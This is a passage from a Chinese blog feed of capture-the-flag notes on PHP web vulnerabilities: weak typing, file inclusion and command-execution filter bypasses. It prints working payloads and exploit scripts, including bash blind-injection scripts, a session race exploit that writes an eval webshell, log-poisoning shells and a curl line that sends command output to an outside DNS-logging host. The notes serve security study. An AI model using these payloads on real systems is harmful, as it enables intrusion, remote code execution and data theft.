转换（默认是十进制），返回变量的整数数值base是0时检测变量格式，有0x前缀使用十六进制，0开头使用八进制，否则使用十进制且只看字母之前的部分intval()不能用于object否则会产生E_NOTICE错误并返回1（也就是True）由于数组为一个对象，所以对这时它会返回1此外，如果字符串以空格开头，intval函数会将其删除，然后再进行转换【弱类型绕过】===是先比较他们的类型然后在比较，==是先把他们转化成相同类型然后在进行比较例如，将一个字符串转换为整数时，PHP会尝试将字符串中的数字部分转换为整数如果字符串中不包含数字，则转换结果为0【strpos 函数】strpos($num, &quot;0&quot;)返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE（区分大小写）【stripos 函数】查找字符串在另一字符串中第一次出现的位置（不区分大小写）注意！字符串位置从0开始，不是从1开始【md5】对象的md5值是由对象的属性和方法组成的字符串的md5散列值。如果两个对象的属性和方法完全相同，则它们的md5值也会相同。因此a[]=1&amp;b[]=2的md5值就是相同的还有0e开头的字符串，会被PHP解释为0弱比较时常用的有QNKCDZO   s878926199a240610708  aabg7XSs  aabC9RqS  s878926199a强比较的需要使用数组绕过当使用string强行转换成字符串时限制了数组绕过这方法强碰撞使用M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2和M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2【in_array 函数】在大海（文件）中捞针（$allow）$allow = array(1,&#39;2&#39;,&#39;3&#39;);var_dump(in_array(&#39;文件&#39;,$allow));返回的为true$allow = array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;);var_dump(in_array(&#39;文件&#39;,$allow));返回false其实还有第三个参数type，用于判断数据类型是否相同php字符串和int比较时字符串会被转换成int因为是弱类型转换，所以数字后面的字符串会被忽略【file_put_contents 函数】file_put_contents(file,data,mode,context)file：规定写入的文件data：写入文件的数据mode：如何打开/写入文件(FILE_USE_INCLUDE_PATH,FILE_APPEND,LOCK_EX)context:文件句柄的环境【array_push 函数】给数组的结尾添加其他数值【PHP反射类】PHP反射类ReflectionClass()是PHP5及以上的一个内置类，它允许开发者在运行时获取一个类的信息:1.获取类的名称、父类、接口和命名空间2.获取类的属性，并获取或修改属性的访问权限、默认值和注释3.获取类的方法，并获取或修改方法的访问权限、参数、返回值和注释4.判断类是否为抽象类、接口或终极类5.获取类的文档注释和注解信息6.动态创建类的实例，并调用类的方法和属性使用echo new ReflectionClass命令即可输出因为ReflectionClass变量已经定义了，所以PHP解释器不会输出警告信息，而是将该变量的值设置为null。最终的效果是输出ReflectionClass类的定义信息，而没有输出警告信息。【call_user_func 函数】call_user_func($func, 1, 2);使用1,2的参数调用func的方法并返回结果【0x识别】7.1以下版本，0x的字符串也是可以识别为十六进制的在高版本下进制转换可以使用hex2bin函数将十六进制转换为ASCII字符例如:&lt;?=`cat *`;经过base64编码变成PD89YGNhdCAqYDs=使用bin2hex函数转换成5044383959474e6864434171594473带e的话会被认为是科学计数法，可以绕过is_numeric检测写入时使用伪协议php://filter/write=convert.base64-decode/resource=1.php注意:等号在base64中只是起到填充的作用，有没有等号解码出来的内容是相同的。【SHA1】sha1弱等于的，找加密后0e开头的即可aaK1STfY ==&gt;0e76658526655756207688271159624026011393aaO8zKZF ==&gt;0e89257456677279068558073954252716165668甚至可以使用数组绕过！【$$覆盖赋值】$var = &#39;hello&#39;;$$var = &#39;world&#39;;echo $hello;      // 输出 world可以看成这样子$var = &#39;hello&#39;;$($var) = &#39;world&#39;;echo $hello;      // 输出 world【ereg】只存在与PHP 5.3.4及之前的版本中一个比较古老的正则表达式匹配函数，一大把的漏洞用指定的模式搜索一个字符串中指定的字符串,成功为true,否则为false（大小写敏感）ereg函数存在NULL（%00）截断漏洞，可以绕过正则过滤，使用%00截断。函数匹配的字符串中包含NULL字符时会在NULL处停止匹配【strrev 函数】翻转字符串，没啥好讲的。【PHP异常处理类】Exception处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类关于内置类的应用前面已经讲过了echo new ReflectionClass(system(&#39;ls&#39;));这种题看似很难，其实只需要在PHP手册里找到合适的类即可【GLOBALS】$GLOBALS — 引用全局作用域中可用的全部变量一个包含了全部变量的全局组合数组，变量的名字就是数组的键。【is_file 函数】检查指定的文件名是否是正常的文件?file=php://filter/resource=1.phpphp://filter/resource=1.phpphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.phpphp://filter/read=convert.quoted-printable-encode/resource=1.phpcompress.zlib://1.php使用伪协议就能绕过检测原因是，伪协议实际上是一种特殊的URI（统一资源标识符），可以用来访问本地或远程的资源。当使用伪协议访问文件时，PHP会将其视为一个URI而不是一个文件路径，因此is_file函数无法判断其是否是一个文件。【filter 函数】对来自非安全来源的数据（比如用户输入）进行验证和过滤实际上感觉没啥用？？？【目录溢出】参数长度超过了配置文件中的&quot;max_input_vars&quot;和&quot;post_max_size&quot;参数时发生溢出发生溢出后可以操作文件读取，文件删除，文件上传，代码执行，拒绝服务例如:?file=/proc/self/root/....../proc/self/root/var/www/html/a.php【trim 函数】trim(string,charlist)string       必需。规定要检查的字符串。charlist     可选。规定从字符串中删除哪些字符。省略该参数则移除下列所有字符：&quot;\0&quot;       - NULL&quot;\t&quot;       - 制表符&quot;\n&quot;       - 换行&quot;\x0B&quot;     - 垂直制表符&quot;\r&quot;       - 回车&quot; &quot;        - 空格绕过时可以用 数字 + - . %09 %0a %0b %0c %0d %20【PHP变量名】PHP变量名由数字字母下划线组成GET或POST的方式传进去的变量名，会自动将空格 + . [ 转换为_而且还有一个特性就是被转化一次之后，就不会再次转换【extract 函数】extract($a)数组a中的键名作为变量名，键值作为变量值，导入到当前的符号表中。如果数组a中存在与当前符号表中已有的变量名相同的键名，则会覆盖已有的变量值。【gettext 函数】在开启该拓展后_()等效于gettext()等效于echo【get_defined_vars 函数】返回一个包含所有已定义变量列表的多维数组，包括环境变量、服务器变量和用户定义的变量【readfile 函数利用】函数作用:读取文件并写入到输出缓冲利用方法:将读取的参数设置为想要读取的文件路径(适当增加../)【正则最大回溯次数绕过/正则溢出攻击】PHP为了防止正则表达式的拒绝服务攻击（reDOS）给 pcre 设定了一个回溯次数上限(pcre.backtrack_limit)回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false注:攻击脚本EXP在文末【小小的语法糖】在PHP中，&#39;或者shell_exec()都是执行shell命令的方法。&#39;是一种语法糖，可以将命令作为字符串嵌入到PHP代码中，相当于执行了shell_exec()方法。但是&#39;只能执行简单的shell命令而且不能获取命令的输出结果。// 使用``语法糖执行shell命令$time = `date`;echo $time;// 使用shell_exec()方法执行shell命令$time = shell_exec(&#39;date&#39;);echo $time;【使用curl获取信息】首先需要一个域名(可以去这里搞一个http://dnslog.cn/或者https://requestbin.net/)再执行命令 ————&gt; curl`ls`.域名【parse_str 函数】把查询字符解析到变量$query_string = &#39;foo[]=123&amp;foo[]=456&#39;;parse_str($query_string, $vars);echo $vars[&#39;foo&#39;][0];  // 输出：123echo $vars[&#39;foo&#39;][1];  // 输出：456【ectract 函数】从数组中将变量导入当前的符号表$person = array(&#39;name&#39; =&gt; &#39;Alice&#39;, &#39;age&#39; =&gt; 25, &#39;gender&#39; =&gt; &#39;female&#39;);extract($person);echo $name;    // 输出：Aliceecho $age;     // 输出：25echo $gender;  // 输出：female【tee 命令】tee用于显示程序的输出并将其复制到一个文件中ls / |tee 1     意思是列出根目录并保存到1文件下【修改源文件的骚方法】sed是一种流编辑器处理下一行，这样不断重复，直到文件末尾但是文件内容并没有改变，除非你使用重定向存储输出xargs是给命令传递参数的一个过滤器可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。当使用系统命令时system(&#39;ls | xargs sed -i &quot;s/exec/system/&quot;&#39;);exec(&#39;ls | xargs sed -i &quot;s/exec/system/&quot;&#39;);【调用类内函数方法】无参调用类的静态方法:classname=classname::member_function无参调用类的数组传递调用:传入的参[0]=classname&amp;传入的参[1]=member_function【Linux命令盲注】if [ `ls / -1|awk &#39;NR==1&#39;|cut -c &#123;&#125; ` = b ];then sleep 2;fi    ls / -1 :列出根目录下的所有文件和目录，每个文件和目录占一行    #awk &#39;NR==&#123;0&#125;&#39; :逐行输出获取    #cut -c &#123;1&#125; :截取单个字符    `` :执行命令并返回结果    sleep 2 :延迟两秒回显    fi :Shell脚本中表示if语句结束Shell命令盲注脚本在文末。【PHP命令数字混合计算】php里数字可以和命令可以进行运算eval(1-phpinfo()-1)的结果为执行phpinfophpinfo()执行成功返回true，1-1-1=-1此时仍然可以使用无字母数字RCE脚本，具体查看文末【create_function 函数】create_function(&#39;$a,$b&#39;,&#39;return 111;&#125;phpinfo();//&#39;)    相当于function a($a, $b)&#123;    return 111;&#125;phpinfo();//&#125;所以  ?show=&#125;?&gt;&lt;?=`ls`;//  就可以执行ls命令【命名空间污染】在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径（使用的是根命名空间）如果你在其他namespace里调用系统类，就必须写绝对路径这种写法因为将函数名改为了以反斜杠（\）开头的命名空间，所以正则表达式无法匹配到这个函数名安全的正则表达式应该是   &#39;/^\\myapp\\[a-z0-9_]*$/isD&#39;【包含session文件】SESSION 文件保存的目录由 session.save_path 指定，文件名以 sess_ 为前缀，后跟 SESSION ID默认路径一般为:/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID文件中的数据是序列化之后的 SESSION 数据getshell方法:添加一个Cookie：PHPSESSID=flag并在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马详细操作请查看上一篇文章。</code></pre><p>各种payload</p><pre><code>小数点(含有0)      ?num=4476.0科学计数           ?num=4476e0十六进制           ?num=0x117c八进制             ?num=010574八进制+空格        ?num= 010574正负号             ?num=+4476.0</code></pre><p>下面记一道$$覆盖赋值的题:</p><pre><code>&lt;?phphighlight_file(__FILE__);include(&#39;flag.php&#39;);error_reporting(0);$error=&#39;你还想要flag嘛？&#39;;$suces=&#39;既然你想要那给你吧！&#39;;foreach($_GET as $key =&gt; $value)&#123;        //自己传入的x是key,flag是value    if($key===&#39;error&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;                       //$(x)=$(flag)，现在相当于x变量就是flag&#125;foreach($_POST as $key =&gt; $value)&#123;       //自己传入的error是key,x是value    if($value===&#39;flag&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;                       //$(error)=$(x)=$(flag)，相当于把error变量重构&#125;if(!($_POST[&#39;flag&#39;]==$flag))&#123;    die($error);                         //error输出时其实已经是flag了&#125;echo &quot;your are good&quot;.$flag.&quot;\n&quot;;die($suces);?&gt;解法:(GET)?x=flag   (POST)error=x</code></pre><p>再来一题</p><pre><code>&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 = $_GET[&#39;v1&#39;];    $v2 = $_GET[&#39;v2&#39;];    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;        if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;        if(preg_match(&#39;/ctfshow/&#39;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125;?&gt;解法:?v1=ctfshow&amp;v2=GLOBALS</code></pre><p>reDOS攻击EXP</p><pre><code>#原理就是提交含有重复的会被正则匹配的巨大的字符串，使它匹配到不能再匹配为止import requestsurl=&quot;??????????&quot;data=&#123;    &#39;?&#39;:&#39;???&#39;*250000+&#39;?????&#39;&#125;r=requests.post(url,data=data)print(r.text)</code></pre><p>bash盲注EXP</p><pre><code>//一些语句自己改正#!/usr/bin/env python3#-*- coding:utf-8 -*-import requestsimport time as tfrom urllib.parse import quote as urlenurl  = &#39;??????/??=&#39;????&#39;;&#39;alphabet = [&#39;&#123;&#39;,&#39;&#125;&#39;, &#39;.&#39;, &#39;@&#39;, &#39;-&#39;,&#39;_&#39;,&#39;=&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;j&#39;,&#39;h&#39;,&#39;i&#39;,&#39;g&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]result = &#39;&#39;for i in range(1,50):    for char in alphabet:        # payload = &quot;if [ `ls  | grep &#39;flag&#39; |cut -c&#123;&#125;` = &#39;&#123;&#125;&#39; ];then sleep 5;fi&quot;.format(i,char) #flag.php        payload = &quot;if [ `cat flag.php | grep &#39;flag&#39; |cut -c&#123;&#125;` = &#39;&#123;&#125;&#39; ];then sleep 5;fi&quot;.format(i,char)        # data = &#123;&#39;cmd&#39;:payload&#125;        try:            start = int(t.time())            r = requests.get(url+payload)            # r = requests.post(url, data=data)            end = int(t.time()) - start            if end &gt;= 3:                        result += char                print(&quot;Flag: &quot;+result)                break        except Exception as e:            print(e)</code></pre><p>Shell命令盲注脚本</p><pre><code>//列出目录import requestsimport timeimport stringstr=string.ascii_letters+string.digits+&#39;_~&#39;result=&quot;&quot;for i in range(1,10):#行    key=0    for j in range(1,15):#列        if key==1:            break        for n in str:            payload=&quot;if [ `ls /|awk &#39;NR==&#123;0&#125;&#39;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)            #print(payload)            url=&quot;?????/?c=&quot;+payload            try:                requests.get(url,timeout=(2.5,2.5))    //延时之类的自己改，看网络情况            except:                result=result+n                print(result)                break            if n==&#39;~&#39;:                key=1                result+=&quot; &quot;                                //获取值import requestsimport timeimport stringstr=string.digits+string.ascii_lowercase+&quot;-&quot;result=&quot;&quot;key=0for j in range(1,45):    print(j)    if key==1:        break    for n in str:        payload=&quot;if [ `cat /1.php|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)        #print(payload)        url=&quot;?????/?c=&quot;+payload        try:            requests.get(url,timeout=(2.5,2.5))        except:            result=result+n            print(result)            break</code></pre><p>无字母数字RCE脚本</p><pre><code>import recontent = &#39;&#39;preg = &#39;[a-z]|[0-9]&#39; # 题目过滤正则# 生成字典for i in range(256):    for j in range(256):        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):            k = i | j            if 32 &lt;= k &lt;= 126:                a = &#39;%&#39; + hex(i)[2:].zfill(2)                b = &#39;%&#39; + hex(j)[2:].zfill(2)                content += (chr(k) + &#39; &#39; + a + &#39; &#39; + b + &#39;\n&#39;)f = open(&#39;rce_or.txt&#39;, &#39;w&#39;)f.write(content)while True:    payload1 = &#39;&#39;    payload2 = &#39;&#39;    code = input(&quot;data:&quot;)    for i in code:        f = open(&#39;rce_or.txt&#39;)        lines = f.readlines()        for line in lines:            if i == line[0]:                payload1 = payload1 + line[2:5]                payload2 = payload2 + line[6:9]                break    payload = &#39;(&quot;&#39;+payload1+&#39;&quot;|&quot;&#39;+payload2+&#39;&quot;)&#39;    print(&quot;payload: &quot;+ payload)</code></pre><p>各种可用的PHP类</p><pre><code>FilesystemIterator遍历文件 getcwd()函数返回当前路径directoryIterator遍历目录</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2023/04/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2023/04/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证<br>导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 </p><p>这种漏洞通常出现在应用程序中动态引用文件的代码中<br>或是出现在用户可以控制文件名、文件路径或文件内容的输入参数上。<br>攻击者可以在这些参数中注入特定的字符，从而构造一个恶意文件路径并被应用程序读取<br>应用程序没有对这个路径进行验证，最终导致攻击者可以获取系统权限或读取任意文件。 </p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ol><li>本地文件包含</li><li>远程文件包含 ：即加载远程文件，在<code>php.ini</code>中开allow_url_include 、allow_url_fopen选项。开启后可以直接执行任意代码。</li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>【截断包含】<br>1.%00会被认为是结束符，后面的数据会被直接忽略，导致扩展名截断<br>2.路径长度截断：<br>Windows下目录最大长度为256字节，超出最大长度之后的部分将全部丢弃<br>Linux下目录最大长度为4096字节，超出的部分会被丢弃。<br>使用超长的../1.php或者一直重复../1.php</p><p>【有限制远程文件包含漏洞绕过】<br>使用<code>?</code>或者<code>%23</code>或者<code>%20</code>截断后缀（已编码）</p><p>【使用伪协议读取文件】</p><pre><code>参数=php://filter/convert.base64-encode/resource=目标文件file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==    file=data://text/plain,&lt;?=`tac f*`;?&gt;</code></pre><p>【UA注入后日志包含】</p><pre><code>user-ugent:&lt;?=eval($_POST[cmd]);?&gt;访问日志文件:?file=/var/log/nginx/access.log使用POST执行命令:cmd=system(“ls”);在UA中注入编码过的代码不会被浏览器解码GET请求的参数在存入PHP之前也不会被解码，但是日志在转发到PHO的端口之前就已经写入日志了。</code></pre><p>【session临时文件条件竞争】</p><pre><code>在.被过滤后php中唯一能无后缀控制的，只有session文件当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。一般的linux会将session保存在下面的的某一个目录下:     /var/lib/php/     /var/lib/php/sessions/     /tmp/     /tmp/sessions/web服务会使用多线程接收用户的请求，以确保能够处理并发进程或线程不同的程序段在多个并发请求时多个进程可能会同时创建同一个session文件那么攻击者就有可能在服务器创建session文件之前，先创建一个同名的session文件并利用PHP_SESSION_UPLOAD_PROGRESS设置文件内容，写入攻击者的命令如果成功存入了恶意文件，就能访问该文件并POST执行RCEEXP放在了文末</code></pre><p>【绕过die函数】</p><pre><code>思路:将die函数的代码语句编码成不能正常执行的命令，然后再将文件内的恶意代码编码成可执行命令。首先，base64加秘后会忽略掉一些符号以及中文字体(只有+, / , 0-9,a-z,A~Z,其余字符都会被跳过)又因为base64加密是4个一组，所以当你随意加上字符补齐die函数的编码时就能绕过die函数例如&quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;解码的内容其实只有phpdie，所以需要再填充两位另外，因为php://filter伪协议支持使用多个过滤器所以可使用strip_tags与base64解码的形式来实现绕过死亡代码例如?file=php://filter/string.strip_tags|convert.base64-decode/resource=4.php除此之外，可以通过使用rot13加密让php引擎把该代码识别成乱码例如&lt;?=system(&#39;tac f*.php&#39;);?&gt;  ————&gt;  &lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;&lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;  ————&gt;  &lt;?=system(&#39;tac f*.php&#39;);?&gt;</code></pre><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><ol><li>禁止远程文件包含allow_url_include=off</li><li>配置open_basedir=指定目录，限制访问区域。</li><li>过滤../等特殊符号</li><li>修改Apache日志文件的存放地址</li><li>开启魔术引号magic_quotes_qpc=on</li><li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li><li>使用白名单或安全沙箱技术</li><li>遵循最小权限原则，确保应用程序具有最小的访问权限。</li></ol><p><a href="https://smms.app/image/MyvPX9diUcxpwSE" target="_blank"><img src="https://s2.loli.net/2023/07/07/MyvPX9diUcxpwSE.png" ></a></p><p>session文件条件竞争EXP</p><pre><code>import requestsimport ioimport threadingurl = &#39;&#39;    # 改成自己的urlsessionid = &#39;truthahn&#39;      # 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahncookies = &#123;            &#39;PHPSESSID&#39;:sessionid        &#125;def write(session):        # write()函数用于写入session临时文件    fileBytes = io.BytesIO(b&#39;a&#39;*1024*50)    # 设置上传文件的大小为50k    data2 = &#123;        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?=eval($_POST[1])?&gt;&#39;    # 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?&gt; 实现一句话    &#125;    files = &#123;        &#39;file&#39;:(&#39;truthahn.jpg&#39;,fileBytes)    &#125;    while True:            res = session.post(url,data=data2,cookies=cookies,files=files)        # print(res.text)        #print(&#39;======= write done! ======&#39;)def read(session):         # read()函数利用session临时文件生成一句话木马，实现rce    data1 = &#123;        &quot;1&quot;:&quot;file_put_contents(&#39;/var/www/html/3.php&#39;,&#39;&lt;?=eval($_POST[2]);?&gt;&#39;);&quot;     # 使用file_put_contents()php内置函数生成名为3.php的shell文件    &#125;    while True:        res = session.post(url+&#39;?file=/tmp/sess_&#39;+sessionid,data=data1,cookies=cookies)        # print(res.text)        res2 = session.get(url+&#39;3.php&#39;)        # print(res2.text)        if res2.status_code == 200:     #若3.php成功生成，则返回Done!，否则返回失败的状态码            print(&#39;++++++++ Done! +++++++++&#39;)        else:            print(res2.status_code)if __name__ == &#39;__main__&#39;:    event = threading.Event()           with requests.session() as session:     # 为每个函数设置5个线程并发执行，可以适当增加以应对系统执行的系统时间        for i in range(5):            #print(&#39;*&#39;*50)            threading.Thread(target=write,args=(session,)).start()        for i in range(5):            #print(&#39;=&#39;*50)            threading.Thread(target=read,args=(session,)).start()    event.set()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>首先看过滤了什么东西，再按照下面的方法一点一点绕过。<br>再利用没过滤的字符构造playload<br>很多是可以泛用的，如果能找到一个很好用的也不错。</p><p>前置知识</p><pre><code>&lt;?=`ls /`;?&gt;等效于&lt;?php echo `ls /`; ?&gt;?cmd=?&gt;&lt;?=`ls \`;闭合第一个php，然后构造第二个短标签形式的phpphp文件上传时，一般是将文件上传到临时目录，然后再将临时目录移到其它地方PHP的一些标签有&lt;?...?&gt;&lt;%...%&gt;&lt;?php ...?&gt;&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code></pre><p>各种绕过手法</p><pre><code>【过滤变量名】重构变量?c=system($_GET[&#39;a&#39;]);&amp;a=cat flag.php;匹配符绕过?c=echo `cat fl&#39;&#39;ag.php`;?c=echo `cat fl/ag.txt`;?c=echo `cat fl*`;php里反引号相当于system执行系统命令两个引号分割是shell特性，执行时会自动忽略还有一点，过滤php时可以用Php大写绕过（乐~）【过滤system】system()assert()passthru()exec()           //只执行无回显shell_exec()     // 只执行无回显popen()          // 不会直接返回执行结果，而是返回一个文件指针popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; );proc_open()      //不会直接返回执行结果，而是返回一个文件指针pcntl_exec()call_user_func()还可以写马，也可以tac /fl\ag |tee 1.txt 将返回的内容写入1.txt【过滤cat】more:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容sh /flag 2&gt;%261  //报错出文件内容strings:可以查看rev:反过来看新增一个xxd可以读取文件curl file:///flag 也行bash -v:/etc/passwddate -f:好像可以越权读取文件/bin/cat:/bin/是cat的目录，意思是执行/bin/cat文件,再用?cat代替cat【过滤空格】&lt;&lt;&gt;%09%20$IFS$&#123;IFS&#125;$IFS$9$IFS$1顺便提一句，%09表示的是制表符，是shell里的空格，而不是php的空格因为浏览器会自动对特殊字符进行编码所以使用%09表示制表符也是可以被浏览器正确识别的【过滤;】使用?&gt;替换，因为最后一句不用分号include，也就是说应该传入一个文件名include的文件中出错了但是主程序会继续往下执行【过滤括号】使用不用括号的函数(伪协议)?c=php://filter/read=convert.base64-encode/resource=flag.php伪协议也可以重构变量?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.txt【PHP伪协议】file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流【文件按包含漏洞】使用data://协议执行PHP代码?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;     显示文件源码?c=data://text/plain,&lt;?=system(&#39;tac fl&quot;&quot;ag.php&#39;);?&gt;      查看日志此处让网页直接包含我们写入的代码，从而执行恶意命令但是仍然要绕过对flag的过滤【常用套娃函数】session_id()：用来获取/设置当前会话 ID，可以获取phpsessionid，并且值是可控的getallheaders()：返回所有的HTTP头信息get_defined_vars() 返回一个包含所有已定义变量列表的多维数组array_pop() 是删除并返回数组最后一个元素current() 返回数组中的当前元素的值。别名是pos()next() 返回数组中的下一个元素的值。end()最后一个prev() 将数组中的内部指针倒回一位each() 返回数组中当前的键/值对并将数组指针向前移动一步scandir() 函数返回指定目录中的文件和目录的数组。print_r() 函数用于打印变量，以更容易理解的形式展示。localeconv()函数会返回一一个包含本地数字及货币格式信息的数组（其实就是.）current() 函数返回数组中的当前元素的值。别名是pos()array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。read_file()  读出源码highlight_file()  读出源码show_source()  读出源码include()  读出源码file_get_contents()  读出源码还能先include(&quot;文件&quot;)再echo $变量;还能先require(&quot;文件&quot;)再echo $变量;还能先include(&quot;文件&quot;);再var_dump(get_defined_vars());【套娃例子】要使用POST传参时:?c=eval(array_pop(next(get_defined_vars())));cmd=system(“cat flag.php”);不使用POST传参时:?c=show_source(next(array_reverse(scandir(pos(localeconv())))));在COOKIE处传马时:/?c=show_source(session_id(session_start()));再把PHPSSID值设为flag.php只使用POST传参时:c=print_r(scandir(&#39;.&#39;));【重定向绕过】0   标准输入1   标准输出2   错误输出/dev/null(空设备)丢弃一切写入其中的数据(但报告写入操作成功)区别：   2&gt;/dev/null   把错误输出到空设备（即丢弃）   2&gt;&amp;1 &gt;/dev/null   错误输出到屏幕上，而标准输出被丢弃   &gt;/dev/null 2&gt;&amp;1   相当于1&gt;/dev/null 2&gt;&amp;1错误和标准输出都输出到空设备重定向&gt;和&gt;&gt;：   前者会先清空文件再写入内容，后者会将重定向的内容追加到现有文件的尾部使用;  &amp;&amp;  %0a  ||等等绕过即可因为过滤代码只将最后一个命令输出到null，使用;或运算符分隔就行但是要注意所用的PHP版本会影响效果，多试试。【无字母数字的命令执行】/bin/base64以base64加密输出文件所以payload: /?c=/???/????64 ????.???或者/usr/bin/bzip2将文件压缩为文件名.bz2然后访问payload: /?c=/???/???/????2 